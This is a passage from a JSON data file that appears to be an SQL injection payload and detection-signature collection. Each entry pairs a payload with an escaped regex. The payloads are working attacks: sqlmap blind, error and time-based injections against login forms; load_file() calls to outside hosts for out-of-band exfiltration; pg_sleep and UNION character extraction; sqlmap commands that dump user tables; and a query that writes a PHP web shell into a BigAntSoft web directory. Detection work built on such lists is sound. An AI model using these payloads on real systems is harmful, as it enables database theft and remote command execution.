      "name": "SQLI mysql --- Parameter: password (POST) Typ [f0be0389]",
      "payload": "mysql\n---\nParameter: password (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)\n    Payload: email=itvBGDRM@burpcollaborator.net&password=v7K!u1n!T7')\nOR NOT 1404=1404-- Eotr\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or\nGROUP BY clause (FLOOR)\n    Payload: email=itvBGDRM@burpcollaborator.net&password=v7K!u1n!T7')\nAND (SELECT 5476 FROM(SELECT COUNT(*),CONCAT(0x717a6b6b71,(SELECT\n(ELT(5476=5476,1))),0x71766a7a71,FLOOR(RAND(0)*2))x FROM\nINFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOUa\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: email=itvBGDRM@burpcollaborator.net&password=v7K!u1n!T7')\nAND (SELECT 6301 FROM (SELECT(SLEEP(15)))MFgI)-- HCqY\n---",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "mysql\\\n\\-\\-\\-\\\nParameter:\\ password\\ \\(POST\\)\\\n\\ \\ \\ \\ Type:\\ boolean\\-based\\ blind\\\n\\ \\ \\ \\ Title:\\ OR\\ boolean\\-based\\ blind\\ \\-\\ WHERE\\ or\\ HAVING\\ clause\\ \\(NOT\\)\\\n\\ \\ \\ \\ Payload:\\ email=itvBGDRM@burpcollaborator\\.net\\&password=v7K!u1n!T7'\\)\\\nOR\\ NOT\\ 1404=1404\\-\\-\\ Eotr\\\n\\\n\\ \\ \\ \\ Type:\\ error\\-based\\\n\\ \\ \\ \\ Title:\\ MySQL\\ >=\\ 5\\.0\\ AND\\ error\\-based\\ \\-\\ WHERE,\\ HAVING,\\ ORDER\\ BY\\ or\\\nGROUP\\ BY\\ clause\\ \\(FLOOR\\)\\\n\\ \\ \\ \\ Payload:\\ email=itvBGDRM@burpcollaborator\\.net\\&password=v7K!u1n!T7'\\)\\\nAND\\ \\(SELECT\\ 5476\\ FROM\\(SELECT\\ COUNT\\(\\*\\),CONCAT\\(0x717a6b6b71,\\(SELECT\\\n\\(ELT\\(5476=5476,1\\)\\)\\),0x71766a7a71,FLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\ FROM\\\nINFORMATION_SCHEMA\\.PLUGINS\\ GROUP\\ BY\\ x\\)a\\)\\-\\-\\ sOUa\\\n\\\n\\ \\ \\ \\ Type:\\ time\\-based\\ blind\\\n\\ \\ \\ \\ Title:\\ MySQL\\ >=\\ 5\\.0\\.12\\ AND\\ time\\-based\\ blind\\ \\(query\\ SLEEP\\)\\\n\\ \\ \\ \\ Payload:\\ email=itvBGDRM@burpcollaborator\\.net\\&password=v7K!u1n!T7'\\)\\\nAND\\ \\(SELECT\\ 6301\\ FROM\\ \\(SELECT\\(SLEEP\\(15\\)\\)\\)MFgI\\)\\-\\-\\ HCqY\\\n\\-\\-\\-",
      "tags": [
        "enumeration",
        "mysql",
        "order-by",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI mysql --- Parameter: useremail (POST) Ty [b4ad6047]",
      "payload": "mysql\n---\nParameter: useremail (POST)\n    Type: boolean-based blind\n    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY\nor GROUP BY clause\n    Payload: useremail=mayuri.infospace@gmail.com'+(select\nload_file('\\\\\\\\lrg0fswvu3w11gp9rr7ek3b74yarylmcp0hn7bw.tupaputka.com\\\\mev'))+''\nRLIKE (SELECT (CASE WHEN (5532=5532) THEN\n0x6d61797572692e696e666f737061636540676d61696c2e636f6d+(select\nload_file(0x5c5c5c5c6c726730667377767533773131677039727237656b33623734796172796c6d637030686e3762772e6f6173746966792e636f6d5c5c6d6576))+''\nELSE 0x28 END)) AND 'tsyu'='tsyu&userpassword=rootadmin\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or\nGROUP BY clause (FLOOR)\n    Payload: useremail=mayuri.infospace@gmail.com'+(select\nload_file('\\\\\\\\lrg0fswvu3w11gp9rr7ek3b74yarylmcp0hn7bw.tupaputka.com\\\\mev'))+''\nAND (SELECT 3518 FROM(SELECT COUNT(*),CONCAT(0x716a766a71,(SELECT\n(ELT(3518=3518,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM\nINFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND\n'gHln'='gHln&userpassword=rootadmin\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)\n    Payload: useremail=mayuri.infospace@gmail.com'+(select\nload_file('\\\\\\\\lrg0fswvu3w11gp9rr7ek3b74yarylmcp0hn7bw.tupaputka.com\\\\mev'))+''\nOR (SELECT 4396 FROM (SELECT(SLEEP(3)))iEbq) AND\n'ZWBa'='ZWBa&userpassword=rootadmin\n---",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "mysql\\\n\\-\\-\\-\\\nParameter:\\ useremail\\ \\(POST\\)\\\n\\ \\ \\ \\ Type:\\ boolean\\-based\\ blind\\\n\\ \\ \\ \\ Title:\\ MySQL\\ RLIKE\\ boolean\\-based\\ blind\\ \\-\\ WHERE,\\ HAVING,\\ ORDER\\ BY\\\nor\\ GROUP\\ BY\\ clause\\\n\\ \\ \\ \\ Payload:\\ useremail=mayuri\\.infospace@gmail\\.com'\\+\\(select\\\nload_file\\('\\\\\\\\\\\\\\\\lrg0fswvu3w11gp9rr7ek3b74yarylmcp0hn7bw\\.tupaputka\\.com\\\\\\\\mev'\\)\\)\\+''\\\nRLIKE\\ \\(SELECT\\ \\(CASE\\ WHEN\\ \\(5532=5532\\)\\ THEN\\\n0x6d61797572692e696e666f737061636540676d61696c2e636f6d\\+\\(select\\\nload_file\\(0x5c5c5c5c6c726730667377767533773131677039727237656b33623734796172796c6d637030686e3762772e6f6173746966792e636f6d5c5c6d6576\\)\\)\\+''\\\nELSE\\ 0x28\\ END\\)\\)\\ AND\\ 'tsyu'='tsyu\\&userpassword=rootadmin\\\n\\\n\\ \\ \\ \\ Type:\\ error\\-based\\\n\\ \\ \\ \\ Title:\\ MySQL\\ >=\\ 5\\.0\\ AND\\ error\\-based\\ \\-\\ WHERE,\\ HAVING,\\ ORDER\\ BY\\ or\\\nGROUP\\ BY\\ clause\\ \\(FLOOR\\)\\\n\\ \\ \\ \\ Payload:\\ useremail=mayuri\\.infospace@gmail\\.com'\\+\\(select\\\nload_file\\('\\\\\\\\\\\\\\\\lrg0fswvu3w11gp9rr7ek3b74yarylmcp0hn7bw\\.tupaputka\\.com\\\\\\\\mev'\\)\\)\\+''\\\nAND\\ \\(SELECT\\ 3518\\ FROM\\(SELECT\\ COUNT\\(\\*\\),CONCAT\\(0x716a766a71,\\(SELECT\\\n\\(ELT\\(3518=3518,1\\)\\)\\),0x71626a6b71,FLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\ FROM\\\nINFORMATION_SCHEMA\\.PLUGINS\\ GROUP\\ BY\\ x\\)a\\)\\ AND\\\n'gHln'='gHln\\&userpassword=rootadmin\\\n\\\n\\ \\ \\ \\ Type:\\ time\\-based\\ blind\\\n\\ \\ \\ \\ Title:\\ MySQL\\ >=\\ 5\\.0\\.12\\ OR\\ time\\-based\\ blind\\ \\(query\\ SLEEP\\)\\\n\\ \\ \\ \\ Payload:\\ useremail=mayuri\\.infospace@gmail\\.com'\\+\\(select\\\nload_file\\('\\\\\\\\\\\\\\\\lrg0fswvu3w11gp9rr7ek3b74yarylmcp0hn7bw\\.tupaputka\\.com\\\\\\\\mev'\\)\\)\\+''\\\nOR\\ \\(SELECT\\ 4396\\ FROM\\ \\(SELECT\\(SLEEP\\(3\\)\\)\\)iEbq\\)\\ AND\\\n'ZWBa'='ZWBa\\&userpassword=rootadmin\\\n\\-\\-\\-",
      "tags": [
        "enumeration",
        "mysql",
        "order-by",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI mysql> SELECT @@version; [7ec7c806]",
      "payload": "mysql> SELECT @@version;",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "mysql>\\ SELECT\\ @@version;",
      "tags": [
        "enumeration",
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI payload = \"a' OR (SELECT 1 FROM (SELECT( [f2da3749]",
      "payload": "payload = \"a' OR (SELECT 1 FROM (SELECT(SLEEP(\" + delay + \")))a)-- -\"",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "payload\\ =\\ \"a'\\ OR\\ \\(SELECT\\ 1\\ FROM\\ \\(SELECT\\(SLEEP\\(\"\\ \\+\\ delay\\ \\+\\ \"\\)\\)\\)a\\)\\-\\-\\ \\-\"",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI payload = ';SELECT \"<?php system($_GET[\\ [82753d66]",
      "payload": "payload = ';SELECT \"<?php system($_GET[\\'cmd\\']); ?>\" INTO OUTFILE \\'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/shell.php\\'-- -'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "payload\\ =\\ ';SELECT\\ \"<\\?php\\ system\\(\\$_GET\\[\\\\'cmd\\\\'\\]\\);\\ \\?>\"\\ INTO\\ OUTFILE\\ \\\\'C:/Program\\ Files\\ \\(x86\\)/BigAntSoft/IM\\ Console/im_webserver/htdocs/shell\\.php\\\\'\\-\\-\\ \\-'",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI phone=&email=&deptType=-1%27+and+6%3d3+o [8e69745d]",
      "payload": "phone=&email=&deptType=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&name=",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "phone=\\&email=\\&deptType=\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27\\&name=",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI phone=&email=&deptType=3&name=-1%27+and+ [59739a64]",
      "payload": "phone=&email=&deptType=3&name=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "phone=\\&email=\\&deptType=3\\&name=\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI phone=&email=-1%27+and+6%3d3+or+1%3d1%2b [0274f8e9]",
      "payload": "phone=&email=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&deptType=3&name=",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "phone=\\&email=\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27\\&deptType=3\\&name=",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI phone=-1%27+and+6%3d3+or+1%3d1%2b(SELECT [0761639c]",
      "payload": "phone=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&email=&deptType=3&name=",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "phone=\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27\\&email=\\&deptType=3\\&name=",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select 1 from pg_sleep(5) [a1ee811a]",
      "payload": "select 1 from pg_sleep(5)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ 1\\ from\\ pg_sleep\\(5\\)",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select case when substring(column,1,1)=' [076290cd]",
      "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ case\\ when\\ substring\\(column,1,1\\)='1'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ table_name\\ limit\\ 1",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select case when substring(column,1,1)=' [4baf5ece]",
      "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ case\\ when\\ substring\\(column,1,1\\)='1'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ table_name\\ where\\ column_name='value'\\ limit\\ 1",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select case when substring(datname,1,1)= [05bd3455]",
      "payload": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ case\\ when\\ substring\\(datname,1,1\\)='1'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ pg_database\\ limit\\ 1",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select case when substring(table_name,1, [a3c7f448]",
      "payload": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ case\\ when\\ substring\\(table_name,1,1\\)='a'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ information_schema\\.tables\\ limit\\ 1",
      "tags": [
        "enumeration",
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select version from openquery(\"link1\",'s [b03b44b8]",
      "payload": "select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ version\\ from\\ openquery\\(\"link1\",'select\\ version\\ from\\ openquery\\(\"link2\",\"select\\ @@version\\ as\\ version\"\\)'\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI select version from openquery(\"linkedser [09a78711]",
      "payload": "select version from openquery(\"linkedserver\", 'select @@version as version');",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "select\\ version\\ from\\ openquery\\(\"linkedserver\",\\ 'select\\ @@version\\ as\\ version'\\);",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sleep(2**retry_number) [731993f3]",
      "payload": "sleep(2**retry_number)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sleep\\(2\\*\\*retry_number\\)",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sql_payload = f\"'UNION SELECT NULL,NULL, [f4ba9baf]",
      "payload": "sql_payload = f\"'UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select*from(select (ascii(substr(database(),{i},1))={j}))a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'\"",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sql_payload\\ =\\ f\"'UNION\\ SELECT\\ NULL,NULL,NULL,NULL,NULL,NULL,NULL,\\(select\\*from\\(select\\ \\(ascii\\(substr\\(database\\(\\),\\{i\\},1\\)\\)=\\{j\\}\\)\\)a\\),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'\"",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sqlmap.py -u \"http://localhost/TaskManag [ad4b8d39]",
      "payload": "sqlmap.py -u \"http://localhost/TaskManagingSystem/loginValidation.php\" -p \"login\" --risk=\"3\" --level=\"3\" --method=\"POST\" --data=\"login=test&password=\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\" --headers=\"Host:localhost\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding:gzip, deflate\\nAccept-Language:en-us,en;q=0.5\\nCache-Control:no-cache\\nContent-Type:application/x-www-form-urlencoded\\nReferer:http://localhost/TaskManagingSystem/login.php\" --dbms=\"MySQL\" --batch --dbs -D tasker -T users --dump",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sqlmap\\.py\\ \\-u\\ \"http://localhost/TaskManagingSystem/loginValidation\\.php\"\\ \\-p\\ \"login\"\\ \\-\\-risk=\"3\"\\ \\-\\-level=\"3\"\\ \\-\\-method=\"POST\"\\ \\-\\-data=\"login=test\\&password=\"\\ \\-\\-user\\-agent=\"Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/100\\.0\\.4896\\.127\\ Safari/537\\.36\"\\ \\-\\-headers=\"Host:localhost\\\\nAccept:text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8\\\\nAccept\\-Encoding:gzip,\\ deflate\\\\nAccept\\-Language:en\\-us,en;q=0\\.5\\\\nCache\\-Control:no\\-cache\\\\nContent\\-Type:application/x\\-www\\-form\\-urlencoded\\\\nReferer:http://localhost/TaskManagingSystem/login\\.php\"\\ \\-\\-dbms=\"MySQL\"\\ \\-\\-batch\\ \\-\\-dbs\\ \\-D\\ tasker\\ \\-T\\ users\\ \\-\\-dump",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sqlmap.py -u \"http://localhost/TaskManag [f1e6ecd0]",
      "payload": "sqlmap.py -u \"http://localhost/TaskManagingSystem/loginValidation.php\" -p \"password\" --risk=\"3\" --level=\"3\" --method=\"POST\" --data=\"login=&password=test\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\" --headers=\"Host:localhost\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding:gzip, deflate\\nAccept-Language:en-us,en;q=0.5\\nCache-Control:no-cache\\nContent-Type:application/x-www-form-urlencoded\\nReferer:http://localhost/TaskManagingSystem/login.php\" --dbms=\"MySQL\" --batch --dbs -D tasker -T users --dump",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sqlmap\\.py\\ \\-u\\ \"http://localhost/TaskManagingSystem/loginValidation\\.php\"\\ \\-p\\ \"password\"\\ \\-\\-risk=\"3\"\\ \\-\\-level=\"3\"\\ \\-\\-method=\"POST\"\\ \\-\\-data=\"login=\\&password=test\"\\ \\-\\-user\\-agent=\"Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/100\\.0\\.4896\\.127\\ Safari/537\\.36\"\\ \\-\\-headers=\"Host:localhost\\\\nAccept:text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8\\\\nAccept\\-Encoding:gzip,\\ deflate\\\\nAccept\\-Language:en\\-us,en;q=0\\.5\\\\nCache\\-Control:no\\-cache\\\\nContent\\-Type:application/x\\-www\\-form\\-urlencoded\\\\nReferer:http://localhost/TaskManagingSystem/login\\.php\"\\ \\-\\-dbms=\"MySQL\"\\ \\-\\-batch\\ \\-\\-dbs\\ \\-D\\ tasker\\ \\-T\\ users\\ \\-\\-dump",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sqlmap.py -u \"http://localhost/intern/co [19dc5e3f]",
      "payload": "sqlmap.py -u \"http://localhost/intern/controller.php\" -p \"deptType\" --risk=\"3\" --level=\"3\" --method=\"POST\" --data=\"phone=&email=&deptType=3&name=\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\" --headers=\"Host:localhost\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding:gzip, deflate\\nAccept-Language:en-us,en;q=0.5\\nCache-Control:no-cache\\nContent-Type:application/x-www-form-urlencoded\\nReferer:http://localhost/intern/\" --dbms=\"MySQL\" --batch --dbs -D department --dump",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sqlmap\\.py\\ \\-u\\ \"http://localhost/intern/controller\\.php\"\\ \\-p\\ \"deptType\"\\ \\-\\-risk=\"3\"\\ \\-\\-level=\"3\"\\ \\-\\-method=\"POST\"\\ \\-\\-data=\"phone=\\&email=\\&deptType=3\\&name=\"\\ \\-\\-user\\-agent=\"Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/100\\.0\\.4896\\.127\\ Safari/537\\.36\"\\ \\-\\-headers=\"Host:localhost\\\\nAccept:text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8\\\\nAccept\\-Encoding:gzip,\\ deflate\\\\nAccept\\-Language:en\\-us,en;q=0\\.5\\\\nCache\\-Control:no\\-cache\\\\nContent\\-Type:application/x\\-www\\-form\\-urlencoded\\\\nReferer:http://localhost/intern/\"\\ \\-\\-dbms=\"MySQL\"\\ \\-\\-batch\\ \\-\\-dbs\\ \\-D\\ department\\ \\-\\-dump",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sqlmap.py -u \"http://localhost/intern/co [054bd964]",
      "payload": "sqlmap.py -u \"http://localhost/intern/controller.php\" -p \"email\" --risk=\"3\" --level=\"3\" --method=\"POST\" --data=\"phone=&email=test&deptType=3&name=\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\" --headers=\"Host:localhost\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding:gzip, deflate\\nAccept-Language:en-us,en;q=0.5\\nCache-Control:no-cache\\nContent-Type:application/x-www-form-urlencoded\\nReferer:http://localhost/intern/\" --dbms=\"MySQL\" --batch --dbs -D department --dump",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
